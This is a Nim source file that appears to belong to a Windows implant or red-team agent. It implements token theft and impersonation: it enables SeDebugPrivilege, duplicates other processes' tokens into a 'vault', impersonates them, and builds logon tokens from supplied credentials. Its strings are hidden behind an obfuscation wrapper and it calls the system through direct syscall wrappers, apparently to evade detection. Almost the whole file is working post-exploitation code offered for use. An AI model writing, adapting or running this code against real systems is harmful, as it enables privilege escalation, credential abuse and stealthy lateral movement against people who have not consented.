import std/json
from std/strutils import parseInt, repeat, rfind, toLower
import ../../utils/global
import ../../utils/msg
import ../../utils/general/strings
from ../../utils/winapi/handlers import
  lookupPrivilegeValueW, lookupPrivilegeNameW, lookupAccountSidW,
  getSidSubAuthorityCount, getSidSubAuthority, getSidIdentifierAuthority,
  getLogicalDriveStringsW, queryDosDeviceW, getCurrentProcessId,
  impersonateLoggedOnUser, revertToSelf, duplicateTokenEx, logonUserW,
  getCurrentThread, openThreadToken, convertSidToStringSidW, localFree
from ../../utils/winapi/syscall import
  openProcess, openProcessToken, queryInformationToken, queryInformationProcess,
  duplicateToken, ntCloseHandle, currentProcess, adjustPrivilegesToken

type
  VaultTokenEntry* = object
    id*: int
    handle*: pointer
    pid*: uint32
    user*: string
    processName*: string

var tokenVault*: seq[VaultTokenEntry] = @[]
var tokenVaultNextId* = 0
var sessionForgedToken*: pointer = nil

const
  tokenQuery = 0x0008'u32
  tokenAdjust = 0x0020'u32
  tokenDuplicate = 0x0002'u32
  tokenAssignPrimary = 0x0001'u32
  tokenAllAccess = 0xF01FF'u32
  processQuery = 0x0400'u32
  tokenUserClass = 1'u32
  tokenPrivilegesClass = 3'u32
  tokenIntegrityClass = 25'u32
  processImageName = 27'u32
  sePrivilegeEnabled = 0x00000002'u32
  sePrivilegeDefault = 0x00000001'u32
  privNameWidth = 46
  securityImpersonation = 2'u32
  tokenPrimary = 1'u32
  logonNetwork = 3'u32
  logonProviderWinNt50 = 3'u32
  statusInfoLengthMismatch = 0xC0000004'u32
  tokenTypeClass = 8'u32

type
  Luid = object
    lowPart*, highPart*: culong
  LuidAttr = object
    luid: Luid
    attributes: culong
  TokenPrivileges = object
    count: culong
    privileges: array[1, LuidAttr]
  SidAndAttributes = object
    sid: pointer
    attributes: culong
  UnicodeString = object
    length, maximumLength: uint16
    buffer: pointer
  MandatoryLabel = object
    label: SidAndAttributes

proc jsonStr*(params, key: string): string =
  # Reads a string field from the json params
  try:
    let p = parseJson(params)
    if p.hasKey(key): p[key].getStr() else: ""
  except JsonParsingError:
    ""

proc jsonInt*(params, key: string): int =
  # Reads an integer field from the json params
  try:
    let p = parseJson(params)
    if not p.hasKey(key): return -1
    let n = p[key]
    if n.kind == JInt: n.getInt() else: parseInt(n.getStr())
  except JsonParsingError:
    -1

proc jsonBool*(params, key: string): bool =
  # Reads a boolean field from the json params
  try:
    let p = parseJson(params)
    if not p.hasKey(key): return false
    let n = p[key]
    if n.kind == JBool: n.getBool()
    else: toLower(n.getStr()) in ["true", "1", "yes"]
  except JsonParsingError:
    false

proc wcsPtrToStr(w: pointer; maxChars: int = 260): string =
  # Converts a wide string pointer into text
  if w == nil: return ""
  let p = cast[ptr UncheckedArray[uint16]](w)
  var buf: array[260, char]
  var i = 0
  while i < maxChars and p[i] != 0'u16 and i < buf.len:
    buf[i] = char(p[i]); inc i
  if i == 0: return ""
  result = newString(i)
  copyMem(addr result[0], addr buf[0], i)

proc queryTokenBuf(token: pointer; cls: culong): seq[byte] =
  # Reads a token information class into a buffer
  var need: culong = 0
  discard queryInformationToken(token, cls, nil, 0, addr need)
  if need == 0: return @[]
  result = newSeq[byte](need.int)
  var st = queryInformationToken(token, cls, addr result[0], need, addr need)
  if st == statusInfoLengthMismatch or need > culong(result.len):
    result = newSeq[byte](need.int)
    st = queryInformationToken(token, cls, addr result[0], need, addr need)
  if st != 0:
    return @[]

proc sidToName(sid: pointer): string =
  # Resolves a sid into an account name
  if sid == nil:
    return obf("<unknown>")
  var nameLen: culong = 256
  var domainLen: culong = 256
  var nameW: array[256, uint16]
  var domainW: array[256, uint16]
  var use: culong = 0
  if lookupAccountSidW(
      nil, sid, addr nameW[0], addr nameLen, addr domainW[0], addr domainLen, addr use) != 0:
    let n = wideToAscii(addr nameW[0], culong(nameLen * 2))
    let d = wideToAscii(addr domainW[0], culong(domainLen * 2))
    if d.len > 0 and n.len > 0:
      return d & obf("\\") & n
    if n.len > 0:
      return n
  var sidStr: pointer = nil
  if convertSidToStringSidW(sid, addr sidStr) != 0 and sidStr != nil:
    defer:
      discard localFree(sidStr)
    return wideToAscii(sidStr, 256)
  obf("<unknown>")

proc tokenUserLabel(token: pointer): string =
  # Reads the user name from a token
  let buf = queryTokenBuf(token, tokenUserClass)
  if buf.len == 0: return obf("<unknown>")
  let sid = cast[ptr pointer](addr buf[0])[]
  sidToName(sid)

proc tokenUserFromProcess*(procH: pointer): string =
  # Reads the user name from a process token
  var tok: pointer
  if openProcessToken(procH, tokenQuery, addr tok) != 0:
    return obf("<unknown>")
  defer: discard ntCloseHandle(tok)
  tokenUserLabel(tok)

proc tokenIntegrity(token: pointer): string =
  # Reads the integrity level from a token
  let buf = queryTokenBuf(token, tokenIntegrityClass)
  if buf.len == 0: return obf("<unknown>")
  let label = cast[ptr MandatoryLabel](addr buf[0])
  let subCount = getSidSubAuthorityCount(label.label.sid)
  if subCount == nil or subCount[] == 0: return obf("<unknown>")
  let rid = getSidSubAuthority(label.label.sid, culong(subCount[] - 1))
  if rid == nil: return obf("<unknown>")
  case rid[]
  of 0x0000'u32: obf("Untrusted")
  of 0x1000'u32: obf("Low")
  of 0x2000'u32: obf("Medium")
  of 0x2100'u32: obf("Medium High")
  of 0x3000'u32: obf("High")
  of 0x4000'u32: obf("System")
  of 0x5000'u32: obf("Protected Process")
  else: obf("0x") & $rid[]

proc formatPrivileges(token: pointer): string =
  # Builds a text list of token privileges
  let buf = queryTokenBuf(token, tokenPrivilegesClass)
  if buf.len == 0: return ""
  let privs = cast[ptr TokenPrivileges](addr buf[0])
  let base = cast[int](addr privs.privileges[0])
  var nameW: array[256, uint16]
  var nameBuf: array[256, char]
  for i in 0 ..< int(privs.count):
    let e = cast[ptr LuidAttr](base + i * sizeof(LuidAttr))
    var nameLen: culong = 256
    var name = obf("<unknown>")
    if lookupPrivilegeNameW(nil, addr e.luid, addr nameW[0], addr nameLen) != 0:
      let nl = wtoa(nameW, nameBuf)
      name = newString(nl)
      copyMem(addr name[0], addr nameBuf[0], nl)
    let status = if (e.attributes and sePrivilegeEnabled) != 0: obf("Enabled")
                 elif (e.attributes and sePrivilegeDefault) != 0: obf("Default")
                 else: obf("Disabled")
    let mark = case status
      of obf("Enabled"): obf("[+] ")
      of obf("Disabled"): obf("[-] ")
      else: obf("[ ] ")
    var line = mark & name
    while line.len < privNameWidth: line.add ' '
    line &= obf("[") & status & obf("]\n")
    result.add line

proc formatTokenSummary*(token: pointer; pid: uint32;
    procName: string): string =
  # Builds a short summary of the token
  result = obf("Process  : ") & procName & obf("  (PID: ") & $pid & obf(")\n")
  result &= obf("User     : ") & tokenUserLabel(token) & "\n"
  result &= obf("Integrity: ") & tokenIntegrity(token) & "\n"

proc processImagePath(procH: pointer): string =
  # Reads the image path of a process
  var need: culong = 0
  var img: array[2048, byte]
  if queryInformationProcess(procH, processImageName, addr img[0], culong(
      img.len), addr need) != 0:
    return ""
  let us = cast[ptr UnicodeString](addr img[0])
  if us.length == 0 or us.buffer == nil: return ""
  wcsPtrToStr(us.buffer)

proc processNameFromHandle(procH: pointer): string =
  # Returns the process name from a handle
  let full = processImagePath(procH)
  if full.len == 0: return obf("<unknown>")
  let sep = full.rfind('\\')
  if sep >= 0: full[sep + 1 .. ^1] else: full

proc ntToWin32(ntPath: string): string =
  # Converts an nt device path into a win32 path
  var drives: array[512, uint16]
  let n = getLogicalDriveStringsW(culong(drives.len), addr drives[0])
  if n == 0: return ntPath
  var i = 0
  while i < int(n):
    var driveW: array[4, uint16]
    var j = 0
    while drives[i + j] != 0'u16 and j < 3:
      driveW[j] = drives[i + j]; inc j
    if j >= 2:
      var dev: array[256, uint16]
      if queryDosDeviceW(addr driveW[0], addr dev[0], culong(dev.len)) > 0:
        let devPath = wcsPtrToStr(addr dev[0], 128)
        if ntPath.len > devPath.len and ntPath[0 ..< devPath.len] == devPath:
          var drive: array[4, char]
          let dl = wtoa(driveW, drive)
          return newString(dl) & ntPath[devPath.len .. ^1]
    i += j + 1
  ntPath

proc openEffectiveToken(): pointer =
  # Opens the current thread or process token
  var token: pointer
  let thread = getCurrentThread()
  if openThreadToken(thread, tokenQuery, 0, addr token) != 0 and token != nil:
    return token
  if openProcessToken(currentProcess, tokenQuery, addr token) != 0:
    return nil
  token

proc tryEnableDebugPrivilege(): bool =
  # Tries to enable the debug privilege
  var token: pointer
  if openProcessToken(currentProcess, tokenQuery or tokenAdjust, addr token) != 0:
    return false
  defer: discard ntCloseHandle(token)
  var luid: Luid
  var nameW: array[32, uint16]
  asciiWide(obf("SeDebugPrivilege"), nameW)
  if lookupPrivilegeValueW(nil, addr nameW[0], addr luid) == 0:
    return false
  var tp: TokenPrivileges
  tp.count = 1
  tp.privileges[0].luid = luid
  tp.privileges[0].attributes = sePrivilegeEnabled
  adjustPrivilegesToken(token, 0, addr tp, culong sizeof(tp), nil, nil) == 0

proc duplicatePrimaryToken(source: pointer): pointer =
  # Duplicates a source token as a primary token
  var dup: pointer
  if duplicateTokenEx(source, tokenAllAccess, nil, securityImpersonation,
      tokenPrimary, addr dup) == 0:
    return dup
  if duplicateToken(source, tokenAllAccess, nil, 0, tokenPrimary, addr dup) == 0:
    return dup
  nil

proc vaultFindById(vaultId: int): int =
  # Finds a vault entry index by id
  for i, e in tokenVault:
    if e.id == vaultId:
      return i
  -1

proc closeSessionForged*() =
  # Closes the forged session token
  if sessionForgedToken != nil:
    discard ntCloseHandle(sessionForgedToken)
  sessionForgedToken = nil

proc revertImpersonation*(): string =
  # Reverts impersonation to the original context
  if revertToSelf() == 0:
    return errorText(obf("RevertToSelf failed"))
  closeSessionForged()
  currentToken = obf("empty")
  obf("Reverted to original security context")

proc grabTokenFromPid*(pid: uint32): string =
  # Grabs a process token and stores it in the vault
  if pid == 0:
    return errorText(obf("missing pid"))
  let selfPid = getCurrentProcessId().uint32
  if pid != selfPid:
    if not tryEnableDebugPrivilege():
      return errorText(obf("failed to enable SeDebugPrivilege"))
  let procH = openProcess(culong(pid), processQuery)
  if procH == nil:
    return errorText(obf("NtOpenProcess failed"))
  defer: discard ntCloseHandle(procH)
  var remote: pointer
  if openProcessToken(procH, tokenDuplicate or tokenQuery, addr remote) != 0:
    return errorText(obf("NtOpenProcessToken failed"))
  defer: discard ntCloseHandle(remote)
  let primary = duplicatePrimaryToken(remote)
  if primary == nil:
    return errorText(obf("failed to duplicate token"))
  let pname = processNameFromHandle(procH)
  let user = tokenUserLabel(primary)
  let entry = VaultTokenEntry(
    id: tokenVaultNextId,
    handle: primary,
    pid: pid,
    user: user,
    processName: pname,
  )
  tokenVault.add entry
  inc tokenVaultNextId
  obf("Token saved to vault [id=") & $entry.id & obf("] user=") & user &
    obf(" process=") & pname & obf(" pid=") & $pid

proc listVaultTokens*(): string =
  # Lists the tokens stored in the vault
  if tokenVault.len == 0:
    return obf("Token vault is empty")
  result = obf("ID   PID    User                          Process\n")
  result &= obf("---- ------ ----------------------------- ----------------\n")
  for e in tokenVault:
    var line = $e.id
    while line.len < 5: line.add ' '
    line &= $e.pid
    while line.len < 12: line.add ' '
    var user = e.user
    if user.len > 29: user = user[0 ..< 29]
    line &= user
    while line.len < 44: line.add ' '
    line &= e.processName & "\n"
    result.add line

proc impersonateVaultToken*(vaultId: int): string =
  # Impersonates a token stored in the vault
  if vaultId < 0:
    return errorText(obf("missing or invalid id"))
  let idx = vaultFindById(vaultId)
  if idx < 0:
    return errorText(obf("token id not found in vault"))
  discard revertToSelf()
  closeSessionForged()
  let h = tokenVault[idx].handle
  if impersonateLoggedOnUser(h) == 0:
    return errorText(obf("ImpersonateLoggedOnUser failed"))
  currentToken = obf("vault:") & $vaultId
  obf("Impersonating vault token [id=") & $vaultId & obf("] user=") &
      tokenVault[idx].user

proc forgeToken*(domain, user, password: string): string =
  # Builds a token from credentials and impersonates it
  if user.len == 0:
    return errorText(obf("missing user"))
  var userW: array[256, uint16]
  var domainW: array[256, uint16]
  var passW: array[512, uint16]
  asciiWide(user, userW)
  asciiWide(if domain.len > 0: domain else: ".", domainW)
  asciiWide(password, passW)
  var logonTok: pointer
  if logonUserW(
      addr userW[0], addr domainW[0], addr passW[0],
      logonNetwork, logonProviderWinNt50, addr logonTok) == 0:
    return errorText(obf("LogonUser failed"))
  let primary = duplicatePrimaryToken(logonTok)
  discard ntCloseHandle(logonTok)
  if primary == nil:
    return errorText(obf("failed to duplicate token"))
  let userLabel = tokenUserLabel(primary)
  let entry = VaultTokenEntry(
    id: tokenVaultNextId,
    handle: primary,
    pid: getCurrentProcessId().uint32,
    user: userLabel,
    processName: user & obf(" <forged>"),
  )
  tokenVault.add entry
  inc tokenVaultNextId
  impersonateVaultToken(entry.id)

proc removeVaultToken*(vaultId: int; all: bool): string =
  # Removes one vault token or clears the vault
  if all:
    for e in tokenVault:
      if e.handle != nil:
        discard ntCloseHandle(e.handle)
    tokenVault.setLen(0)
    return obf("Cleared all tokens from vault")
  if vaultId < 0:
    return errorText(obf("missing id (or use --all)"))
  let idx = vaultFindById(vaultId)
  if idx < 0:
    return errorText(obf("token id not found in vault"))
  let e = tokenVault[idx]
  if e.handle != nil:
    discard ntCloseHandle(e.handle)
  tokenVault.delete(idx)
  obf("Removed vault token [id=") & $vaultId & obf("]")

proc currentTokenReport*(): string =
  # Builds a report of the current token
  let token = openEffectiveToken()
  if token == nil:
    return errorText(obf("could not open current token"))
  defer: discard ntCloseHandle(token)
  formatTokenSummary(
    token, getCurrentProcessId().uint32, processNameFromHandle(currentProcess))
